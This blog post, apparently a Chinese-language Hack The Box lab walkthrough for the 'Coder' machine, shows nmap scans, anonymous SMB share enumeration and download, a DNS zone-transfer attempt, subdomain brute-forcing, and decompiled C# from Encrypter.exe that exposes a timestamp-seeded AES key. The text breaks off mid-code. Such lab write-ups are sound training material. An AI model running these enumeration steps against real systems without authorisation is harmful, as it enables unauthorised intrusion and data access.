<!DOCTYPE html>
<html lang="en">
    <head prefix="og: https://ogp.me/ns#">
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="color-scheme" content="light dark">
  
  <title>HTB-Machine-Coder - Chromos2me&#39;s Blog</title>
  
    <link rel="shortcut icon" href="/favicon.jpg">
  
  
    <link rel='manifest' href='/manifest.json'>
  

  
  
  
  <meta property="og:title" content="HTB-Machine-Coder - Chromos2me&#39;s Blog" />
  
  <meta property="og:type" content="article" />
  
  <meta property="og:url" content="http://chromos2me.github.io/2025/04/27/HTB-Machine-Coder/index.html" />
  
  <meta property="og:image" content="/favicon.png" />
  
  <meta property="og:article:published_time" content="2025-04-27T13:47:26.000Z" />
  
  <meta property="og:article:author" content="Chromos2me" />
  
  

  
<link rel="stylesheet" href="/css/var.css">

  
<link rel="stylesheet" href="/css/main.css">

  
<link rel="stylesheet" href="/css/typography.css">

  
<link rel="stylesheet" href="/css/code-highlighting.css">

  
<link rel="stylesheet" href="/css/components.css">

  
<link rel="stylesheet" href="/css/nav.css">

  
<link rel="stylesheet" href="/css/paginator.css">

  
<link rel="stylesheet" href="/css/footer.css">

  
<link rel="stylesheet" href="/css/post-list.css">

  
  
<link rel="stylesheet" href="/css/rainbow-banner.css">

  
  
  
<link rel="stylesheet" href="/css/toc.css">

  
  
  
  
  
<link rel="stylesheet" href="/css/post.css">

  
  
  
  
  

  
<meta name="generator" content="Hexo 7.3.0"></head>
    <body
        data-color-scheme="auto"
        data-uppercase-categories="true"
        
        data-rainbow-banner="true"
        data-rainbow-banner-shown="always"
        data-rainbow-banner-month="6"
        data-rainbow-banner-colors="#e50000,#ff8d00,#ffee00,#008121,#004cff,#760188"
        
        data-config-root="/"
        
        data-toc="true"
        data-toc-max-depth="2"
        
        
    >
        <nav id="theme-nav">
    <div class="inner">
        <a class="title" href="/">Chromos2me&#39;s Blog</a>
        <div class="nav-arrow"></div>
        <div class="nav-items">
            <a class="nav-item nav-item-home" href="/">Home</a>
            
            
            <a class="nav-item" href="/archives">Archives</a>
            
            
            
            <a class="nav-item" href="/categories">Categories</a>
            
            
            
            <a class="nav-item" href="/tags">Tags</a>
            
            
            
            <a class="nav-item" href="/friends">Friends</a>
            
            
            
            <a class="nav-item" href="/about">About</a>
            
            
            
            <a class="nav-item nav-item-github nav-item-icon" href="https://github.com/Chromos2me" target="_blank" aria-label="GitHub">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-search nav-item-icon" href="/search" target="_blank" aria-label="Search">&nbsp;</a>
            
            
        </div>
    </div>
</nav>
        
<article class="post">
    <div class="meta">
        
        <div class="categories text-uppercase">
        
            <a href="/categories/HTB/">HTB</a>
        
        </div>
        

        
        <div class="date" id="date">
            <span>April</span>
            <span>27,</span>
            <span>2025</span>
        </div>
        

        <h1 class="title">HTB-Machine-Coder</h1>
    </div>

    <div class="divider"></div>

    <div class="content">
        <p><img src="/2025/04/27/HTB-Machine-Coder/Coder.png" alt="Coder"></p>
<h2 id="nmap扫描"><a class="markdownIt-Anchor" href="#nmap扫描"></a> nmap扫描</h2>
<p>先扫描所有开放端口</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -sT --min-rate 10000 -p- 10.10.11.207 -oA nmapscan/ports</span><br></pre></td></tr></table></figure>
<p>结果如下</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">PORT      STATE SERVICE</span><br><span class="line">53/tcp    open  domain</span><br><span class="line">80/tcp    open  http</span><br><span class="line">135/tcp   open  msrpc</span><br><span class="line">139/tcp   open  netbios-ssn</span><br><span class="line">443/tcp   open  https</span><br><span class="line">445/tcp   open  microsoft-ds</span><br><span class="line">464/tcp   open  kpasswd5</span><br><span class="line">593/tcp   open  http-rpc-epmap</span><br><span class="line">9389/tcp  open  adws</span><br><span class="line">47001/tcp open  winrm</span><br><span class="line">49664/tcp open  unknown</span><br><span class="line">49665/tcp open  unknown</span><br><span class="line">49666/tcp open  unknown</span><br><span class="line">49667/tcp open  unknown</span><br><span class="line">49671/tcp open  unknown</span><br><span class="line">49685/tcp open  unknown</span><br><span class="line">49700/tcp open  unknown</span><br></pre></td></tr></table></figure>
<blockquote>
<p>这里我又使用不加<code>-sT</code>命令进行了一次扫描</p>
<p><code>-sT</code> 扫描:</p>
<p>即TCP Connect扫描，<code>nmap</code>会尝试与目标主机的每个指定端口建立完整的 TCP 三次握手连接，<strong>如果连接成功，端口被认为是开放的；如果连接失败，端口被认为是关闭的或被过滤的</strong>，这种扫描方式不需要特殊权限，但更容易被检测到</p>
<p>不加<code>-sT</code>（默认 SYN 扫描，<code>-sS</code>）：</p>
<p>SYN扫描或半开放扫描，<code>nmap</code>发送一个 SYN 包到目标端口，如果收到 SYN/ACK 响应，则认为端口是开放的，然后 <code>nmap</code> 会发送一个 RST 包来终止连接，而不完成三次握手。这种方式速度快且隐秘，但需要管理员权限。</p>
<p>结果如下</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&gt;PORT      STATE SERVICE</span><br><span class="line">&gt;53/tcp    open  domain</span><br><span class="line">&gt;80/tcp    open  http</span><br><span class="line">&gt;88/tcp    open  kerberos-sec</span><br><span class="line">&gt;135/tcp   open  msrpc</span><br><span class="line">&gt;139/tcp   open  netbios-ssn</span><br><span class="line">&gt;389/tcp   open  ldap</span><br><span class="line">&gt;443/tcp   open  https</span><br><span class="line">&gt;445/tcp   open  microsoft-ds</span><br><span class="line">&gt;464/tcp   open  kpasswd5</span><br><span class="line">&gt;593/tcp   open  http-rpc-epmap</span><br><span class="line">&gt;636/tcp   open  ldapssl</span><br><span class="line">&gt;3268/tcp  open  globalcatLDAP</span><br><span class="line">&gt;3269/tcp  open  globalcatLDAPssl</span><br><span class="line">&gt;5985/tcp  open  wsman</span><br><span class="line">&gt;9389/tcp  open  adws</span><br><span class="line">&gt;47001/tcp open  winrm</span><br><span class="line">&gt;49664/tcp open  unknown</span><br><span class="line">&gt;49665/tcp open  unknown</span><br><span class="line">&gt;49666/tcp open  unknown</span><br><span class="line">&gt;49667/tcp open  unknown</span><br><span class="line">&gt;49669/tcp open  unknown</span><br><span class="line">&gt;49670/tcp open  unknown</span><br><span class="line">&gt;49671/tcp open  unknown</span><br><span class="line">&gt;49677/tcp open  unknown</span><br><span class="line">&gt;49680/tcp open  unknown</span><br><span class="line">&gt;49685/tcp open  unknown</span><br><span class="line">&gt;49700/tcp open  unknown</span><br><span class="line">&gt;49711/tcp open  unknown</span><br></pre></td></tr></table></figure>
<p>可见这种扫描更加的全面</p>
</blockquote>
<p>对所有开放端口进行更详细的扫描</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -sT -sV -sC -O -p<span class="variable">$ports</span> 10.10.11.207 -oA nmapscan/detail   </span><br></pre></td></tr></table></figure>
<p>结果如下</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line">PORT      STATE SERVICE       VERSION</span><br><span class="line">53/tcp    open  domain        Simple DNS Plus</span><br><span class="line">80/tcp    open  http          Microsoft IIS httpd 10.0</span><br><span class="line">|_http-server-header: Microsoft-IIS/10.0</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">|_http-title: IIS Windows Server</span><br><span class="line">88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-03-22 21:32:25Z)</span><br><span class="line">135/tcp   open  msrpc         Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: coder.htb0., Site: Default-First-Site-Name)</span><br><span class="line">| ssl-cert: Subject: </span><br><span class="line">| Subject Alternative Name: DNS:dc01.coder.htb, DNS:coder.htb, DNS:CODER</span><br><span class="line">| Not valid before: 2023-11-21T23:06:46</span><br><span class="line">|_Not valid after:  2033-11-21T23:16:46</span><br><span class="line">|_ssl-<span class="built_in">date</span>: 2025-03-22T21:33:30+00:00; +7h30m22s from scanner time.</span><br><span class="line">443/tcp   open  ssl/http      Microsoft IIS httpd 10.0</span><br><span class="line">| ssl-cert: Subject: commonName=default-ssl/organizationName=HTB/stateOrProvinceName=CA/countryName=US</span><br><span class="line">| Not valid before: 2022-11-04T17:25:43</span><br><span class="line">|_Not valid after:  2032-11-01T17:25:43</span><br><span class="line">|_http-title: IIS Windows Server</span><br><span class="line">| tls-alpn: </span><br><span class="line">|_  http/1.1</span><br><span class="line">|_ssl-<span class="built_in">date</span>: 2025-03-22T21:33:30+00:00; +7h30m22s from scanner time.</span><br><span class="line">|_http-server-header: Microsoft-IIS/10.0</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">445/tcp   open  microsoft-ds?</span><br><span class="line">464/tcp   open  kpasswd5?</span><br><span class="line">593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636/tcp   open  ssl/ldap</span><br><span class="line">|_ssl-<span class="built_in">date</span>: 2025-03-22T21:33:30+00:00; +7h30m22s from scanner time.</span><br><span class="line">| ssl-cert: Subject: </span><br><span class="line">| Subject Alternative Name: DNS:dc01.coder.htb, DNS:coder.htb, DNS:CODER</span><br><span class="line">| Not valid before: 2023-11-21T23:06:46</span><br><span class="line">|_Not valid after:  2033-11-21T23:16:46</span><br><span class="line">3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: coder.htb0., Site: Default-First-Site-Name)</span><br><span class="line">| ssl-cert: Subject: </span><br><span class="line">| Subject Alternative Name: DNS:dc01.coder.htb, DNS:coder.htb, DNS:CODER</span><br><span class="line">| Not valid before: 2023-11-21T23:06:46</span><br><span class="line">|_Not valid after:  2033-11-21T23:16:46</span><br><span class="line">|_ssl-<span class="built_in">date</span>: 2025-03-22T21:33:32+00:00; +7h30m22s from scanner time.</span><br><span class="line">3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: coder.htb0., Site: Default-First-Site-Name)</span><br><span class="line">|_ssl-<span class="built_in">date</span>: 2025-03-22T21:33:30+00:00; +7h30m22s from scanner time.</span><br><span class="line">| ssl-cert: Subject: </span><br><span class="line">| Subject Alternative Name: DNS:dc01.coder.htb, DNS:coder.htb, DNS:CODER</span><br><span class="line">| Not valid before: 2023-11-21T23:06:46</span><br><span class="line">|_Not valid after:  2033-11-21T23:16:46</span><br><span class="line">5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI/2.0</span><br><span class="line">|_http-title: Not Found</span><br><span class="line">9389/tcp  open  mc-nmf        .NET Message Framing</span><br><span class="line">47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">|_http-title: Not Found</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI/2.0</span><br><span class="line">49664/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49665/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49666/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49667/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49669/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49670/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">49671/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49677/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49680/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49685/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49700/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49711/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Aggressive OS guesses: Microsoft Windows Server 2019 (96%), Microsoft Windows Server 2016 (95%), Microsoft Windows 10 (93%), Microsoft Windows 10 1709 - 21H2 (93%), Microsoft Windows 10 21H1 (93%), Microsoft Windows Server 2022 (93%), Microsoft Windows 10 1903 (92%), Microsoft Windows Server 2012 (92%), Windows Server 2019 (92%), Microsoft Windows Longhorn (92%)</span><br><span class="line">No exact OS matches <span class="keyword">for</span> host (<span class="built_in">test</span> conditions non-ideal).</span><br><span class="line">Network Distance: 2 hops</span><br><span class="line">Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">| smb2-time: </span><br><span class="line">|   <span class="built_in">date</span>: 2025-03-22T21:33:24</span><br><span class="line">|_  start_date: N/A</span><br><span class="line">|_clock-skew: mean: 7h30m21s, deviation: 0s, median: 7h30m21s</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   3:1:1: </span><br><span class="line">|_    Message signing enabled and required</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 83.14 seconds</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>进行udp端口扫描</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -sU --top-ports 40 10.10.11.207 -oA nmapscan/udp</span><br></pre></td></tr></table></figure>
<p>结果如下</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">PORT     STATE         SERVICE</span><br><span class="line">53/udp   open          domain</span><br><span class="line">123/udp  open          ntp</span><br><span class="line">137/udp  open|filtered netbios-ns</span><br><span class="line">138/udp  open|filtered netbios-dgm</span><br><span class="line">500/udp  open|filtered isakmp</span><br><span class="line">4500/udp open|filtered nat-t-ike</span><br><span class="line">5353/udp open|filtered zeroconf</span><br></pre></td></tr></table></figure>
<p>我们现在得到的信息有</p>
<ul>
<li>SMB 445</li>
<li>DNS 53</li>
<li>HTTP 80</li>
<li>HTTPS 443</li>
<li>Kerberos 88</li>
<li>LDAP 389</li>
<li>RPC 135</li>
<li>WinRM 5985</li>
</ul>
<p>容易得到这是一个域控</p>
<p>我们将上面得到的域名信息加入hosts文件中</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;10.10.11.207 coder.htb dc01.coder.htb&quot;</span> | sudo <span class="built_in">tee</span> -a /etc/hosts</span><br></pre></td></tr></table></figure>
<h2 id="smb枚举"><a class="markdownIt-Anchor" href="#smb枚举"></a> smb枚举</h2>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nxc smb 10.10.11.207 --shares</span><br></pre></td></tr></table></figure>
<p><img src="/2025/04/27/HTB-Machine-Coder/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20250322221519.png" alt="微信截图_20250322221519"></p>
<p>我们从上面的枚举中看出，smb服务器启用了签名，同时启用了SMBv2协议，但是我们无法列出共享，接下来尝试使用匿名账户登录</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nxc smb 10.10.11.207 -u chromos2me -p <span class="string">&#x27;&#x27;</span> --shares</span><br></pre></td></tr></table></figure>
<p><img src="/2025/04/27/HTB-Machine-Coder/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20250322222044.png" alt="微信截图_20250322222044"></p>
<p>从上面可以看出匿名账户可以登录，同时我们有读<code>Development</code>，<code>IPC$ </code>，<code>Users</code>共享的权限</p>
<h3 id="读取development共享"><a class="markdownIt-Anchor" href="#读取development共享"></a> 读取Development共享</h3>
<p>我们直接指定不需要密码进行共享连接</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient -N //10.10.11.207/Development </span><br></pre></td></tr></table></figure>
<p>我们发现存在两个共享文件夹</p>
<p><img src="/2025/04/27/HTB-Machine-Coder/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20250323131320.png" alt="微信截图_20250323131320"></p>
<p>先查看<code>Migrations</code>共享文件夹</p>
<p><img src="/2025/04/27/HTB-Machine-Coder/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20250323131558.png" alt="微信截图_20250323131558"></p>
<blockquote>
<p><code>adcs_reporting</code>：来自Github存储库PowerShell-AdminScripts的<a href="ActiveDirectoryCertificateServices/Get-ADCS_Report.ps1">ActiveDirectoryCertificateServices/Get-ADCS_Report.ps1</a></p>
<p><code>bootstrap-template-master</code>：来自Github存储库<a target="_blank" rel="noopener" href="https://github.com/pro-dev-ph/bootstrap-responsive-web-application-template">bootstrap-responsive-web-application-template</a></p>
<p><code>Cachet-2.4</code>：来自存储库<a target="_blank" rel="noopener" href="https://github.com/cachethq/cachet/tree/2.4">cachet</a></p>
<p><code>kimchi-master</code>：来自存储库<a target="_blank" rel="noopener" href="https://github.com/kimchi-project/kimchi">kimchi</a></p>
</blockquote>
<p>只有<code>teamcity_test_repo</code>这个存储库看起来能被我们进行利用，我们将其保存到本地，需要递归下载整个文件夹需要开启下面的设置</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mask <span class="string">&quot;&quot;</span></span><br><span class="line">recurse ON</span><br><span class="line">prompt OFF</span><br></pre></td></tr></table></figure>
<blockquote>
<p><code>mask &quot;&quot;</code>：用于设置上传文件的权限掩码，<code>&quot;&quot;</code>表示不应用任何权限掩码，通常会使用服务器默认的 <code>create mask</code> 或 <code>directory mask</code> 设置</p>
<p><code>recurse ON</code>：启用递归模式，即允许操作目录及其所有子目录中的文件，例如在 <code>mget</code>（批量下载）或 <code>mput</code>（批量上传）时，<code>recurse ON</code> 允许操作整个目录结构，而不仅仅是当前目录的文件</p>
<p><code>prompt OFF</code>：关闭交互式提示，避免 <code>smbclient</code> 在执行 <code>mget</code> 或 <code>mput</code> 这些命令时询问是否确认下载/上传每个文件</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mget \Migrations\teamcity_test_repo </span><br></pre></td></tr></table></figure>
<p>我们在.git文件夹下的config文件中发现一名用户信息<code>Sonya Blade</code>及其邮箱<code>s.blade@coder.htb</code></p>
<p><img src="/2025/04/27/HTB-Machine-Coder/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20250323140335.png" alt="微信截图_20250323140335"></p>
<p>读取Temporary Projects共享文件夹</p>
<p><img src="/2025/04/27/HTB-Machine-Coder/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20250323140953.png" alt="微信截图_20250323140953"></p>
<p>我们发现了一个加密器和加密后的文件，仍然下载下来</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mget <span class="string">&quot;Temporary Projects&quot;</span></span><br></pre></td></tr></table></figure>
<p>这里我们需要对<code>Encrypter.exe</code>进行逆向，放到后面进行</p>
<h3 id="读取user共享"><a class="markdownIt-Anchor" href="#读取user共享"></a> 读取User共享</h3>
<p>，没什么有用的东西</p>
<h2 id="dns区域传送漏洞"><a class="markdownIt-Anchor" href="#dns区域传送漏洞"></a> DNS区域传送漏洞</h2>
<p>我们现在获取到了域名<code>coder.htb</code>，我们向DNS服务器发起<code>AXFR</code>DNS 区域传输请求，看一下返回的结果</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dig @10.10.11.207 coder.htb axfr</span><br></pre></td></tr></table></figure>
<p><img src="/2025/04/27/HTB-Machine-Coder/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20250323142619.png" alt="微信截图_20250323142619"></p>
<blockquote>
<p>Windows下可以利用下面的方法</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;nslookup</span><br><span class="line">&gt;server &lt;dns-server&gt;</span><br><span class="line">&gt;<span class="built_in">set</span> <span class="built_in">type</span>=AXFR</span><br><span class="line">&gt;&lt;domain&gt;</span><br></pre></td></tr></table></figure>
</blockquote>
<p>现在区域传输失败了，我们尝试对子域进行爆破</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dnsenum --dnsserver 10.10.11.207 -f /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-20000.txt coder.htb</span><br></pre></td></tr></table></figure>
<p><img src="/2025/04/27/HTB-Machine-Coder/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20250323211201.png" alt="微信截图_20250323211201"></p>
<p>对爆破出来的子域进行了手动测试，发现并没有什么有用的信息</p>
<h2 id="80443端口"><a class="markdownIt-Anchor" href="#80443端口"></a> 80/443端口</h2>
<p>80端口仅仅是一个IIS的欢迎界面，没有什么其他的信息</p>
<p><img src="/2025/04/27/HTB-Machine-Coder/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20250323211545.png" alt="微信截图_20250323211545"></p>
<p>443端口仍是欢迎界面，这样的话就可以先不进行目录爆破了，我们先对拿到的可执行文件进行逆向</p>
<h2 id="encrypterexe逆向"><a class="markdownIt-Anchor" href="#encrypterexe逆向"></a> Encrypter.exe逆向</h2>
<p>我们在dnspy中打开Encrypter.exe，发现如下图的程序主体逻辑</p>
<p><img src="/2025/04/27/HTB-Machine-Coder/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20250323212613.png" alt="微信截图_20250323212613"></p>
<p>先分析Main函数</p>
<figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// AES</span></span><br><span class="line"><span class="comment">// Token: 0x06000001 RID: 1 RVA: 0x00002050 File Offset: 0x00000250</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">bool</span> flag = args.Length != <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">if</span> (flag)</span><br><span class="line">	&#123;</span><br><span class="line">		Console.WriteLine(<span class="string">&quot;You must provide the name of a file to encrypt.&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		FileInfo fileInfo = <span class="keyword">new</span> FileInfo(args[<span class="number">0</span>]);</span><br><span class="line">		<span class="built_in">string</span> destFile = Path.ChangeExtension(fileInfo.Name, <span class="string">&quot;.enc&quot;</span>);</span><br><span class="line">		<span class="built_in">long</span> <span class="keyword">value</span> = DateTimeOffset.Now.ToUnixTimeSeconds();</span><br><span class="line">		Random random = <span class="keyword">new</span> Random(Convert.ToInt32(<span class="keyword">value</span>));</span><br><span class="line">		<span class="built_in">byte</span>[] array = <span class="keyword">new</span> <span class="built_in">byte</span>[<span class="number">16</span>];</span><br><span class="line">		random.NextBytes(array);</span><br><span class="line">		<span class="built_in">byte</span>[] array2 = <span class="keyword">new</span> <span class="built_in">byte</span>[<span class="number">32</span>];</span><br><span class="line">		random.NextBytes(array2);</span><br><span class="line">		<span class="built_in">byte</span>[] array3 = AES.EncryptFile(fileInfo.Name, destFile, array2, array);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>程序调用EncryptFile对文件进行AES加密，并给加密后的文件更改后缀为enc，但是这里的随机种子是<code>value</code>，它是通过<code>DateTimeOffset.Now.ToUnixTimeSeconds()</code>获取的，先获取当前的日期和时间并将其转换为 Unix 时间戳，那么这里的随机数就存在被我们预测的可能性。</p>
<p>接下来查看<code>EncryptFile</code>这个函数</p>
<figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// AES</span></span><br><span class="line"><span class="comment">// Token: 0x06000002 RID: 2 RVA: 0x000020E8 File Offset: 0x000002E8</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="built_in">byte</span>[] <span class="title">EncryptFile</span>(<span class="params"><span class="built_in">string</span> sourceFile, <span class="built_in">string</span> destFile, <span class="built_in">byte</span>[] Key, <span class="built_in">byte</span>[] IV</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">using</span> (RijndaelManaged rijndaelManaged = <span class="keyword">new</span> RijndaelManaged())</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">using</span> (FileStream fileStream = <span class="keyword">new</span> FileStream(destFile, FileMode.Create))</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">using</span> (ICryptoTransform cryptoTransform = rijndaelManaged.CreateEncryptor(Key, IV))</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">using</span> (CryptoStream cryptoStream = <span class="keyword">new</span> CryptoStream(fileStream, cryptoTransform, CryptoStreamMode.Write))</span><br><span class="line">				